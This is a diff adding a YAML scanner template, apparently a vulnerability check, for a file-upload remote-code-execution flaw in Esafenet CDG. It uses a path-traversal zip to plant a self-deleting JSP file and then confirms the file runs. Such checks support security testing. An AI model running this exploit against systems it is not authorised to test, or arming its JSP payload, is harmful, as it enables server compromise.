@@ -1,0 +1,36 @@
+name: yaml-poc-esafenet-cdg-rce-CT-1056284
+binding: 4737ee76-e913-4fa4-84b2-1aa3b6edd052
+manual: false
+detail:
+    author: kun.fang
+    vulnerability:
+        id: 3dfa0e31-2b8f-4f50-941f-c8a68fc96493
+        level: critical
+    warning: File Upload (Auto Clear)
+transport: http
+set:
+    randomFileName: randomLowercase(8)
+    randomContent: randomLowercase(8)
+    rboundary: randomLowercase(8)
+    fname: r"../../../js/"+randomFileName+r".jsp"
+    filecontent: bytes("<% out.print(\"" + randomContent + "\"); new java.io.File(application.getRealPath(request.getServletPath())).delete();%>")
+    payload: zipSlip(fname, filecontent)
+rules:
+    r2:
+        request:
+            cache: true
+            method: POST
+            path: /CDGServer3/hiddenWatermark/uploadFile
+            headers:
+                Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+            body: "------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data; name=\"doc\"; filename=\"{{randomFileName}}.zip\"\r\nContent-Type: application/zip\r\n\r\n{{payload}}\r\n------WebKitFormBoundary{{rboundary}}--\r\n"
+            follow_redirects: false
+        expression: response.status == 200
+    r3:
+        request:
+            cache: true
+            method: GET
+            path: /CDGServer3/js/{{randomFileName}}.jsp
+            follow_redirects: false
+        expression: response.status == 200 && response.body_string.contains(randomContent)
+expression: r2() && r3()
